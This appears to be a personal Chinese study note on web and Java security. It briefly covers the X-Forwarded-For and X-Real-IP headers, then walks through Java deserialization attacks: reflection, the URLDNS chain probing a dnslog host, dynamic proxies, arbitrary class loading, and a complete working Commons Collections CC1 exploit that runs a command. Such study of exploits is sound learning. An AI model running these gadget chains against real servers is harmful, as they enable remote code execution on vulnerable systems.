# Note

# 特殊的Header头——X-Forwarded-For 与 X-Real-IP

### X-Forwarded-For

记录代理服务器的地址，每经过一个代理，该字段会加上一个记录，由于是记录来源地址，所以该字段不会保存最后一个代理服务器的地址

> - 存储客户端 ip 和反向代理IP 列表，以逗号+空格分隔
> - 记录最后直连实际服务器之前的整个代理过程
> - 可能会被伪造 ip，但是直连实际服务器这段不会被伪造

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/0502c9cb16192d595bbe61f8ee5f9fc9.png)

### X-Real-IP

也是用来记录服务器的地址，但是和上面的不同，它不把记录添加到结尾，而是直接替换。

> - 请求实际服务器的 IP
> - 每过一层代理都会被覆盖掉，只需第一层设置代理
> - IP可以被伪造，但如果存在一级以上的代理，它就不会收到影响，因为每经过一次代理，它就会被覆盖

![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/3bbee021d2f59a0a6d7a41c3bb46a617.png)

总结来自原文[特殊的Header头——X-Forwarded-For 与 X-Real-IP 学习_x-real-ip x-forwarded-for-CSDN博客](https://blog.csdn.net/m0_47404181/article/details/107143156)

### x-client-ip





# Java反序列化

### 什么是序列化和反序列化

序列化：将对象转换为字符串
反序列化：将字符串转换为对象



### 序列化的安全问题

序列化中存在两个重要的方法 writeObject 和 readObject,且都可以进行`重写`

#### **那为什么要重写？**

例如，MyList 这个类定义了一个 arr 数组属性，初始化的数组长度为 100。在实际序列化时如果让 arr 属性参与序列化的话，那么长度为 100 的数组都会被序列化下来，但是我在数组中可能只存放 30 个数组而已，这明显是不可理的，所以这里就要自定义序列化过程啦，具体的做法是重写以下两个 private 方法：

```java
private void writeObject(java.io.ObjectOutputStream s)throws java.io.IOException
private void readObject(java.io.ObjectInputStream s)throws java.io.IOException, ClassNotFoundException
```

**攻击者可以构造恶意的序列化数据，当服务器端对这些恶意数据进行反序列化时，如果`readObject`方法没有对输入数据进行严格的验证和安全检查，就可能导致攻击者在服务器上执行任意代码。**



### 可能存在安全漏洞的形式

1. ####  入口类的`readObject`直接调用危险方法*（实际开发中不太常见）*

   例如：

   ```java
    public void readObject(ObejectOutputStream ois) throws IOException, ClassNotFoundException {
           ois.defaultReadObject();// 调用默认的反序列化方法
           Runtime.getRuntime().exec("calc");// 执行命令,打开计算机       
   
       }
   ```

   

2. #### 入口参数中包含可控类，该类有危险方法，`readObject`时调用

3. #### 入口类参数中包含可控类，该类又调用其他有危险方法的类，`readObject`时调用

4. #### 构造函数/静态代码块等类加载时隐式执行



### 产生漏洞的攻击路线

1. #### 继承 Serializable (接口都没有，你咋反序列化呢)

2. #### 入口类：source 

   - 重写 readObject 调用常见的函数
   - 参数类型宽泛，比如可以传入一个类作为参数
   - 最好 jdk 自带

3. #### 找到入口类之后要找调用链 gadget chain 相同名称、相同类型

4. #### 执行类 sink （RCE SSRF 写文件等等）比如`exec`这种函数



### java反射

示例：

Person.java

```java
import java.io.IOException;
import java.io.Serializable;

public class Person implements Serializable {

    public String name;
    private int age;

    public Person(){

    }
    // 构造函数
    public Person(String name, int age){
        this.name = name;// 给属性赋值
        this.age = age;
    }
// 重写toString方法 
    @Override
    public String toString(){
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }
    

    private void action(String act) throws IOException {
        Runtime.getRuntime().exec(act);

    }
}
```



ReflectionTest.java

```java
import java.lang.reflect.*;

public class ReflectionTest {

    public static void main(String[] args) throws Exception {
        Person person = new Person();
        Class c = person.getClass();
       //c.newInstance();
        Constructor personConstructor = c.getConstructor(String.class, int.class);
        Person p = (Person) personConstructor.newInstance("John", 42);
        System.out.println(p);
        
        //获取类里面的属性
        Field[] personfields = c.getDeclaredFields();//使用Class对象的getDeclaredFields方法获取类中声明的所有字段并存储在数组personfields中。
        //遍历数组
        for (Field f : personfields) {
            System.out.println(f);
        }

        Field ageField = c.getDeclaredField("age");//获取指定的属性
        ageField.setAccessible(true);//设置属性为可访问
        ageField.set(p,55);//设置属性的值
        System.out.println(p);

        //调用类里面的方法
        Method[] personmethods= c.getMethods();
        for (Method m : personmethods) {
            System.out.println(m);
        }

        Method actionMethod = c.getDeclaredMethod("action", String.class);//获取指定的方法
        actionMethod.setAccessible(true);//设置方法为可访问
        actionMethod.invoke(p,"calc");

    }
}
```

要对Person类进行反射，我们首先要创建一个Person类的实例，然后通过对象的getClass()方法获取其对应的Class对象。接着使用Class对象的getConstructor方法获取指定参数类型的构造函数，使用获取到的构造函数创建一个新的Person对象，并将其赋值给变量p。

```java
        Person person = new Person();
        Class c = person.getClass();
       //c.newInstance();
        Constructor personConstructor = c.getConstructor(String.class, int.class);
        Person p = (Person) personConstructor.newInstance("John", 42);
```

接下来我们要获取类中的属性

> ###### `getDeclaredFields()`
>
> - **功能**：返回类中所有已声明的字段，包括`private`、`protected`、`public`和默认（包级私有）访问权限的字段，但**不包括**从父类继承的字段。
>
> ##### `getFields()`
>
> - **功能**：返回类及其所有父类中所有可访问的`public`字段。这里的 “可访问” 是指在当前类加载环境下具有`public`访问权限的字段。

由于age字段为private权限，故我们需要使用`getDeclaredFields()`方法

同时由于private，我们若想要对age字段进行修改，需要设置后，方可进行修改

```java
ageField.setAccessible(true);//设置属性为可访问
```

同时也是由于`反射`给予了我们修改属性的更高权限，所以我们才可以修改`private`权限的属性

执行`ageField.set(p,55);`（由于是要对实例进行修改，故第一个参数要放我们前面实例好的p）

后输出p，我们可以得到

```java
Person{name='John', age=55}
```

进一步，我们可以调用类中的方法。

我们可以先获取类中所有的方法（与上述获取字段信息同理）

> `getMethods()`
>
> - `public`
>
> `getDeclaredMethods()`
>
> - `private`、`protected`、`public`和默认

我们接着调用我们写的action方法

```java
Method actionMethod = c.getDeclaredMethod("action", String.class);//获取指定的方法
actionMethod.setAccessible(true);//设置方法为可访问
actionMethod.invoke(p,"calc");
```

由于action方法需要输入一个字符串，故我们要标明`String.class`

最后用`invoke()`方法来调用Person对象p的action方法，并传递一个字符串参数"calc"。成功打开计算器。



### URLDNS链

```
Gadget Chain:
    HashMap.readObject()
    HashMap.putVal()
    HashMap.hash()
    URL.hashCode()
```

Gadget Chain如上

示例代码：

SerializationTest.java

```java
import java.io. *;
import java.lang.reflect.Field;
import java.util.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;


public class SerializationTest {
    public static void serialize(Object obj) throws IOException{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static void main(String[] args) throws Exception{
//        Person person = new Person("Tom", 20);
//        serialize(person);
          HashMap<URL,Integer> hashmap = new HashMap<URL,Integer>();
//          不想这里发起请求，把url对象的hashcode改成不是-1
          URL url = new URL("http://tyfe87.dnslog.cn");
          Class c = url.getClass();
          Field hashcodefield = c.getDeclaredField("hashCode");
          hashcodefield.setAccessible(true);
          hashcodefield.set(url,911);
          hashmap.put(url,1);
          hashcodefield.set(url,-1);
//          这里把hashcode改回-1
          serialize(hashmap);
    }
}
```



UnserializeTest.java

```java
import java.io.FileInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;

public class UnserializeTest {
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws Exception{
        Object obj = unserialize("ser.bin");
        System.out.println(obj);
    }
}
```

当`hashCode`的值为`-1`时，会执行`hashCode = handler.hashCode(this);`从而向url发送dns请求

而`hashCode`的默认值就为`-1`，在执行一次`hashCode = handler.hashCode(this);`之后`hashCode`的值会发生改变。

这就会导致本地再进行序列化执行`hashmap.put(url,1);`时，就会向url发送dns请求，使`hashCode`的值发生改变，导致客服端在进行反序列化使并不会发送dns请求，我们无法确定服务端是否存在反序列化漏洞。

为了解决这个问题，我们需要使用Java反射的方法，我们可以先将hashCode的值进行修改为一个非-1的数，在执行完`hashmap.put(url,1);`后再将hashCode的值修改为-1，那样就能实现dns请求只会由客服端发出，而不会从本地发出，帮助我们确认反序列化漏洞。

```java
          Class c = url.getClass();
          Field hashcodefield = c.getDeclaredField("hashCode");
          hashcodefield.setAccessible(true);
//          不想这里发起请求，把url对象的hashcode改成不是-1
          hashcodefield.set(url,911);
          hashmap.put(url,1);
          hashcodefield.set(url,-1);
//          这里把hashcode改回-1
          serialize(hashmap);
```

<img src="C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241105131422758.png" alt="image-20241105131422758"  />

### Java静态代理

接口IUser.java

```java
public interface IUser {
    void show();
}
```

UserImpl.java

```java
public class UserImpl implements IUser {
    public UserImpl() {

    }
    @Override
    public void show(){

        System.out.println("展示");
    }
}

```

UserProxy.java

```java
public class UserProxy implements IUser {
    IUser user;
    public UserProxy() {

    }
    public UserProxy(IUser user) {
        this.user = user;
    }
    @Override
    public void show() {
        user.show();
        System.out.println("调用了show");
    }
}

```

ProxyTest.java

```java
public class ProxyTest {
    public static  void main(String[] args) {
        //静态代理
        IUser user = new UserImpl();
        IUser userProxy = new UserProxy(user);
        userProxy.show();
    }

}
```

### Java动态代理

假设UserImpl.java中不止show()一个方法，如果我想通过UserProxy.java显示调用了何种方法，那我就要相应的在UserProxy.java中重写对应的方法，非常麻烦，如下图

UserImpl.java

```java
public class UserImpl implements IUser {
    public UserImpl() {

    }
    @Override
    public void show(){

        System.out.println("展示");
    }
    @Override
    public void add() {
        System.out.println("添加");
    }
    @Override
    public void remove() {
        System.out.println("删除");
    }
}

```

UserProxy.java

```java
public class UserProxy implements IUser {
    IUser user;
    public UserProxy() {

    }
    public UserProxy(IUser user) {
        this.user = user;
    }
    @Override
    public void show() {
        user.show();
        System.out.println("调用了show");
    }

    @Override
    public void add() {
        user.add();
        System.out.println("调用了add");
    }

    @Override
    public void remove() {
        user.remove();
        System.out.println("调用了remove");
    }
}

```

我们可以通过动态代理来解决这个问题

新建一个UserInvocationHandler类，调用InvocationHandler 接口

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
/**
 * UserInvocationHandler 类实现了 InvocationHandler 接口，用于处理动态代理的方法调用
 */
public class UserInvocationHandler implements InvocationHandler {
    IUser user;
    public UserInvocationHandler() {

    }
    public UserInvocationHandler(IUser user) {
        this.user = user;
    }
  
  //invoke方法的作用是拦截对代理对象的方法调用，并将调用转发给被代理对象。
  //invoke会拦截一切对代理对象方法的调用（漏洞）
    @Override
    public Object invoke(Object proxy,Method method,Object[] args)throws Throwable {
        System.out.println("调用了"+method.getName());//获取调用的方法名
        method.invoke(user,args);
        return null;
    }
}

```

ProxyTest.txt

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;

public class ProxyTest {
    public static  void main(String[] args) {
        IUser user = new UserImpl();
//        动态代理
        InvocationHandler userinvocationhandler = new UserInvocationHandler(user);
//        IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userinvocationhandler);
        IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), new Class<?>[]{IUser.class},userinvocationhandler);
        //与上面同理

        userProxy.show();

    }

}
```

通过动态代理的方法可以动态获取调用的属性名，解决了静态代理的繁琐

### 动态代理对反序列化漏洞的作用

由于动态代理中使用的`invoke`会拦截一切对代理对象方法的调用，而且可以通过invoke函数调用函数（找不到同名函数时），将两条链拼接在一起。



### Java类的动态加载

<img src="https://segmentfault.com/img/bVbMls6" alt="image" style="zoom:150%;" />



Person.java

```java
import java.io.IOException;
import java.io.Serializable;

public class Person implements Serializable {

    public String name;
    private int age;

    public static int id;
    static{
        System.out.println("静态代码块");
    }
    //无论调用哪种静态代码块都会调用

    {
        System.out.println("构造代码块");
    }
    //无论调用哪种代码块都会调用



    public Person(){
        System.out.println("无参代码块");

    }
    // 构造函数
    public Person(String name, int age){
        System.out.println("有参代码块");
        this.name = name;// 给属性赋值
        this.age = age;
    }
    
    public static void stasticAction() {}
//  构造静态代码块  
    
 
// 重写toString方法
    @Override
    public String toString(){
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

// 重写hashCode方法
    private void action(String act) throws IOException {
        Runtime.getRuntime().exec(act);

    }
}
```

新建一个LoadClassTest.java来加载Student类

```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        new Person();//调用无参方法
    }
}

'''  
静态代码块
构造代码块
无参代码块   
'''
```

```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        new Person("aa",11);//调用有参方法
    }
}

'''    
静态代码块
构造代码块
有参代码块  
'''
```

调用静态代码块

```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        Person.stasticAction();

    }
}
'''
静态代码块   
'''
```

由上述代码可知，java在执行相应代码时对相应的代码块进行了初始化

而如果我仅仅是获取Person类，则只会进行加载，不会进行初始化，如下

```JAVA
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        Class c =   Person.class;// 获得类对象
    }
}
//无回显
```

但如果使用forname()方法来获取对应类则会进行初始化

```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        Class c = Class.forName("Person");// 获得类对象


    }
}
'''
静态代码块
'''
```

进一步跟进forname()方法

<img src="C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241103142856797.png" alt="image-20241103142856797" style="zoom:150%;" />

我们可以发现forname()默认就会进行初始化，图中可见参数二默认为`true`

第一个参数为类名，第三个参数则要获取类加载器ClassLoader,如下

```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = ClassLoader.getPlatformClassLoader(); // 获得类加载器
        Class.forName("Person",false,classLoader);// 获得类对象
    }
}
//无回显
```

这样获取类对象则不会进行初始化，只有当对象实例化时，才会初始化

```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader(); // 获得类加载器
        Class<?> c = Class.forName("Person",false,classLoader);// 获得类对象
        c.newInstance();// 实例化一个对象

    }
}
'''
静态代码块
构造代码块
无参代码块
'''
```



##### 双亲委派模型

<img src="https://i-blog.csdnimg.cn/blog_migrate/9149a05dcbc01ba44b25092742905e43.png#pic_center" alt="双亲委派模型"  />



> `loadClass `方法的主要职责就是实现双亲委派机制：首先检查这个类是不是已经被加载过了，如果加载过了直接返回，否则委派给父加载器加载，这是一个递归调用，**一层一层向上委派，最顶层的类加载器（启动类加载器）无法加载该类时，再一层一层向下委派给子类加载器加载**。

类加载器的作用



```java
public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader(); // 获得类加载器
        Class<?> c = classLoader.loadClass("Person");
        //c.newInstance();

    }
}
```

`loadClass默认是不进行初始化的`

*假设我们可以加载任意类，那我们的攻击面就很广*

跟进loadClass

<img src="C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241103151029558.png" alt="image-20241103151029558" style="zoom:200%;" />

...

Java调试没看懂之后再补吧

直接上结论

子类关系：ClassLoader -> SecureClassLoader -> URLClassLoader -> AppClassLoader (父->子)

继承关系：loadClass -> findClass(重写的方法) -> defineClass(从字节码加载类)



###### URLClassLoader来加载任意类

```java
import java.net.URL;
import java.net.URLClassLoader;

public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader(); // 获得类加载器
//        Class<?> c = Class.forName("Person",false,classLoader);// 获得类对象
//        c.newInstance();// 实例化一个对象

//        Class<?> c = classLoader.loadClass("Person");// 获得类对象
//        c.newInstance();
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("file:///D:\\test\\")});
        Class<?> c = urlClassLoader.loadClass("Test");
        c.newInstance();

    }
}

```

Test.class

```java

import java.io.IOException;

public class Test {
    public Test() {
    }

    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException var1) {
            IOException e = var1;
            throw new RuntimeException(e);
        }
    }
}
```

URLClassLoader加载支持多种协议如`file`,`jar`,`http`

> URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("http://")});
>
> URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL("jar:http://")});



###### ClassLoader.defineClass字节码加载任意类（私有）

进一步通过Java反射调用defineClass方法（defienClass为私密类），通过difienClass字节码加载任意类

```java
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;

public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader(); // 获得类加载器
        //defineClass
        Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defineClassMethod.setAccessible(true);

        byte[] code = Files.readAllBytes(Paths.get("D:\\test\\Test.class"));
        Class c= (Class) defineClassMethod.invoke(classLoader, code,0,code.length);
        c.newInstance();// 实例化一个对象
    }
}
```



##### Unsafe类调用defineClass方法

由于Unsafe入口会进行安全检查，顾无法直接调用里面的defineClass方法（public）

```java
Unsafe.getUnsafe();//会报错
```

示例

```java
import sun.misc.Unsafe;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class LoadClassTest {
    public static void main(String[] args) throws Exception {
        ClassLoader classLoader = ClassLoader.getSystemClassLoader(); // 获得类加载器
        byte[] code = Files.readAllBytes(Paths.get("D:\\test\\Test.class"));
        Class c = Unsafe.class;
        Field theUnsafeField = c.getDeclaredField("theUnsafe");
        theUnsafeField.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
        Class c2 = (Class) unsafe.defineClass("Test",code,0,code.length,classLoader,null);
        c2.newInstance();


    }
}
```



> 总结：
>
> - URLClassLoader来加载任意类
> - ClassLoader.defineClass字节码加载任意类（私有类）
> - Unsafe.defineClass字节码加载（pulic类）不能直接生成 Spring里面可以直接生成



### 什么是Commons Collections？

[Apache Commons](http://commons.apache.org/)是Apache软件基金会的项目，曾经隶属于`Jakarta`项目。`Commons`的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：`Proper`（是一些已发布的项目）、`Sandbox`（是一些正在开发的项目）和`Dormant`（是一些刚启动或者已经停止维护的项目）。

[Commons Collections](http://commons.apache.org/proper/commons-collections/)包为Java标准的`Collections API`提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。

### 反序列化之CC1

示例一

```java
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class CC1 {
    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Runtime run = Runtime.getRuntime();
        Class c = Runtime.class;
        Method execMethod = c.getDeclaredMethod("exec",String.class);
        execMethod.invoke(run,"calc");
     }
}
```

这是一个通过Java反射调用Runtime方法执行打开计算器指令的代码

我们先看链子中的InvokerTransformer,可以看到

```java
public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
                
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    }
```

`InvokerTransformer`类实现了`Tranformer`接口中`transform`方法。此方法接收了一个对象，然后反射调用，参数可控就导致了**反射调用任意类，任意方法**。此处写法酷似后门写法。

我们可以尝试一下用`InvokerTransformer中`的`transform`方法调用计算器

我们首先查看`InvokerTransformer`类的有参构造函数怎么用：

```java
 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
```

由此可知String methodName -> 参数名，  Class[] paramTypes -> 参数类型 , Object[] args -> 参数值

清楚用法之后写一个demo

```java
package org.apache.commons.collections;
import org.apache.commons.collections.functors.InvokerTransformer;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
public class cc1 {
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException {
        Runtime c = Runtime.getRuntime();
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(c);
    }
}

```

成功打开计算器

此时我们知道InvokerTransformer.transform能够调用危险方法

那我们接着往回找（找谁调用了transform），跟进transform，查找transform的用法

我们可以看到一个叫`TransformedMap`的类多次调用了`transform`（还有cc1的另一个方向LazyMap，不过国内一般是`TransformedMap`）

我们可以看到在`TransformedMap`中可以通过`checkSetValue`方法调用`transform`

我们先看看`valueTransformer`是什么，查看它的构造函数

![image-20241106134358410](C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241106134358410.png)

这个构造函数是一个内部方法，接受了三个参数，其中包括我们要找的`valueTransformer`，但该方法只能通过类里面的其他方法进行调用

我们继续找

![image-20241106135054288](C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241106135054288.png)

可以看到这个叫`decorate`将传入的参数赋给了`TransformedMap`,而且他是一个静态的方法，我们可以调用试试

```java
    Runtime r = Runtime.getRuntime();
    InvokerTransformer invokerTransformer = (InvokerTransformer) new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
    HashMap<Object,Object> map = new HashMap<>();
    TransformedMap.decorate(map, null, invokerTransformer);
```

我虽然已经搞定了`valueTransformer`，但是我们还需要控制`checkSetValue`中的value值

<img src="C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241106135932775.png" alt="image-20241106135932775" style="zoom:150%;" />

我们先查找一下`checkSetValue`的调用

![image-20241106133705385](C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241106133705385.png)

我可以看到只有一个结果，也就是说他只被`AbstractInputCheckedMapDecorator`这个抽象类调用

继续跟进去

![image-20241106141030252](C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241106141030252.png)

我们其实可以发现这个`AbstractInputCheckedMapDecorator`其实就是`TransformedMap`的一个父类，而在他之中的`MapEntry`类调用了`setValue`方法

> - Entry是指一对键值对

这里的`setValue`其实就是对Map.Entry方法进行了重写，由此可知我们只需要将上面`decorate`修饰的参数作为Map进行遍历，同时传入我们想要的value值，即可走到`TransformedMap`这一步，写一下

![image-20241106142434392](C:\Users\xrntk\AppData\Roaming\Typora\typora-user-images\image-20241106142434392.png)

成功打开计算器

以下是目前为止推出来的链

> A.readObject  --> O.setValue(Map.entry)    --> InvokerTransformer.transform --> 危险方法
>
> O.aaa             O2.transform 

跟进setValue，查找setValue的用法

我们可以找到`AnnotationInvocationHandler`中的readObject调用了setValue，且其格式完全符合我们上面测试的格式，基本上可以确定这是我们要找的类

......

...这里看懵逼了，还要再斟酌一下



最终的成品：

```java
package org.apache.commons.collections;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

public class cc1 {
    public  static  void  serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public  static  Object  unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }

    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException {


        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class }, new Object[]{"getRuntime" , null}),
                new InvokerTransformer("invoke" , new Class[]{Object.class, Object[].class} , new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new  ChainedTransformer(transformers);

        HashMap<Object,Object> map = new HashMap<>();
        map.put("value", "aaa");
        Map<Object,Object> transformedMap =  TransformedMap.decorate(map, null, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstruct = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHandlerConstruct.setAccessible(true);
        Object o = annotationInvocationHandlerConstruct.newInstance(Target.class, transformedMap);

        serialize(o);
        unserialize("ser.bin");


    }
}

```

